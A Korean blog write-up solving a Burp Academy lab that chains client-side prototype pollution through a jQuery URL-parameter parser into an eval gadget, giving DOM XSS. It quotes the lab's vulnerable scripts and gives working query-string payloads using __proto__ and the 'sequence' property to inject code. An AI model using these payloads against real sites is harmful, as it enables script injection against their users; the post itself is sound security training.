---
layout: post
title: "Burp Academy 문제풀이 - DOM XSS via an alternative prototype pollution vector"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Prototype Pollution]
toc: true
---


# 개요
- 프로토타입 폴루션(Prototype Pollution, 프로토타입 오염) 취약점으로 인한 XSS 에 대한 추가 문제이다. 
- 문제 주소: https://portswigger.net/web-security/prototype-pollution/finding/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector
- 프로토타입 폴루션 설명 주소
1. https://portswigger.net/web-security/prototype-pollution
2. https://portswigger.net/web-security/prototype-pollution/finding
- 난이도: PRACTITIONER (중간)

# 문제 분석

```
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

Find a source that you can use to add arbitrary properties to the global Object.prototype.

Identify a gadget property that allows you to execute arbitrary JavaScript.

Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.
```
문제 1과 비슷한 타입인 것 같다. 

# 취약점이 있는 곳 찾기 
먼저 이 페이지에 어떤 자바스크립트 파일이 포함되어 있는지 확인해본다. `resources/js` 디렉토리를 확인해보니 `jquery_3-0-0.js`, `jquery_parseparams.js`, `searchLoggerAlternative.js` 파일이 있다. `jquery_3-0-0.js`는 일반적인 jQuery 라이브러리 파일로 보인다. `jquery_parseparams.js`는 유저(웹사이트 개발자)가 정의한 파일로 보인다.  

## searchLoggerAlternative.js
`searchLoggerAlternative.js`의 소스코드는 다음과 같다. 

```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```

searchLogger 함수가 의심스럽다. 특히 이 부분이다.

```js
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```

`eval` 함수가 사용되어 있다. `manager.sequence` 에 코드를 삽입할 수만 있다면 alert창을 실행시킬 수 있을 것 같다. 

## jquery_parseparams.js
`jquery_parseparams.js`의 소스코드는 다음과 같다. GET 요청의 URL 파라메터를 자바스크립트의 오브젝트로 변환해주는 기능인 것 같다. 주석부분을 보면, URL파라메터가 어떻게 변환되는지를 알 수 있다. 프로토타입 폴루션을 방지하는 코드는 없는 것 같다. 

```js
// Add an URL parser to JQuery that returns an object
// This function is meant to be used with an URL like the window.location
// Use: $.parseParams('http://mysite.com/?var=string') or $.parseParams() to parse the window.location
// Simple variable:  ?var=abc                        returns {var: "abc"}
// Simple object:    ?var.length=2&var.scope=123     returns {var: {length: "2", scope: "123"}}
// Simple array:     ?var[]=0&var[]=9                returns {var: ["0", "9"]}
// Array with index: ?var[0]=0&var[1]=9              returns {var: ["0", "9"]}
// Nested objects:   ?my.var.is.here=5               returns {my: {var: {is: {here: "5"}}}}
// All together:     ?var=a&my.var[]=b&my.cookie=no  returns {var: "a", my: {var: ["b"], cookie: "no"}}
// You just cant have an object in an array, ?var[1].test=abc DOES NOT WORK
(function ($) {
    var re = /([^&=]+)=?([^&]*)/g;
    var decode = function (str) {
        return decodeURIComponent(str.replace(/\+/g, ' '));
    };
    $.parseParams = function (query) {
        // recursive function to construct the result object
        function createElement(params, key, value) {
            key = key + '';
            // if the key is a property
            if (key.indexOf('.') !== -1) {
                // extract the first part with the name of the object
                var list = key.split('.');
                // the rest of the key
                var new_key = key.split(/\.(.+)?/)[1];
                // create the object if it doesnt exist
                if (!params[list[0]]) params[list[0]] = {};
                // if the key is not empty, create it in the object
                if (new_key !== '') {
                    createElement(params[list[0]], new_key, value);
                } else console.warn('parseParams :: empty property in key "' + key + '"');
            } else
                // if the key is an array
            if (key.indexOf('[') !== -1) {
                // extract the array name
                var list = key.split('[');
                key = list[0];
                // extract the index of the array
                var list = list[1].split(']');
                var index = list[0]
                // if index is empty, just push the value at the end of the array
                if (index == '') {
                    if (!params) params = {};
                    if (!params[key] || !$.isArray(params[key])) params[key] = [];
                    params[key].push(value);
                } else
                    // add the value at the index (must be an integer)
                {
                    if (!params) params = {};
                    if (!params[key] || !$.isArray(params[key])) params[key] = [];
                    params[key][parseInt(index)] = value;
                }
            } else
                // just normal key
            {
                if (!params) params = {};
                params[key] = value;
            }
        }
        // be sure the query is a string
        query = query + '';
        if (query === '') query = window.location + '';
        var params = {}, e;
        if (query) {
            // remove # from end of query
            if (query.indexOf('#') !== -1) {
                query = query.substr(0, query.indexOf('#'));
            }

            // remove ? at the begining of the query
            if (query.indexOf('?') !== -1) {
                query = query.substr(query.indexOf('?') + 1, query.length);
            } else return {};
            // empty parameters
            if (query == '') return {};
            // execute a createElement on every key and value
            while (e = re.exec(query)) {
                var key = decode(e[1]);
                var value = decode(e[2]);
                createElement(params, key, value);
            }
        }
        return params;
    };
})(jQuery);
```


## 테스트 
문제 설명을 보면 `global Object.prototype` 라는 표현이 있다. 글로벌 Object 의 프로토타입을 오염시키는 것이 우선 필요조건이다. 따라서 다음 페이로드를 시도해보았다. 

```
?search=test&object.__proto__.test=alert(1)
```

그리고 시도한 후에 크롬 디버거 툴의 console창에서 다음 커맨드를 입력해서 값을 테스트해보니 프로토타입 폴루션이 되는 것을 확인할 수 있었다. 

```
Object.prototype['test']
Object.prototype.test
```


![프로토타입 폴루션 확인](/images/burp-academy-prototype-pollution-2-1.png)

## 풀이 
그러면 이제 어떤 값을 넣어야 alert 창을 실행시킬 수 있는지를 생각해봐야 한다. 

페이지를 분석했을 때 의심스러웠던 부분의 코드를 다시 한번 잘 살펴본다. 

```js
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```

manager 는 자바스크립트의 전역변수이므로 Object 클래스를 상속받았을 것이다. 따라서 Object의 프로토타입을 오염시키면 그 것이 manager 변수에도 상속될 것으로 생각된다. 위의 코드에서는 manager 변수의 sequence 속성에 접근하고 있다. 따라서 Object 클래스의 프로토타입에 sequence라는 속성을 추가해두면 문제가 풀릴 것 같다. 

다음 페이로드를 궁리했다. 

```
?search=test&object.__proto__.sequence=2);alert(1
```

이 페이로드에서 실제로 sequence 속성에 들어가는 값 `2);alert(1`은 다음 코드를 거치면서 `2);alert(11` 로 변한다. 

```
let a = manager.sequence || 1;
    manager.sequence = a + 1;
```

그리고 eval 함수 부분 코드와 결합하면 다음과 같이 된다. 

```
eval('if(manager && manager.sequence){manager.macro(2);alert(11)}');
```

테스트해보면 alert 창이 실행되는 것을 확인할 수 있다. 

![프로토타입 폴루션 확인](/images/burp-academy-prototype-pollution-2-2.png)

성공!

![프로토타입 폴루션 확인](/images/burp-academy-prototype-pollution-2-3.png)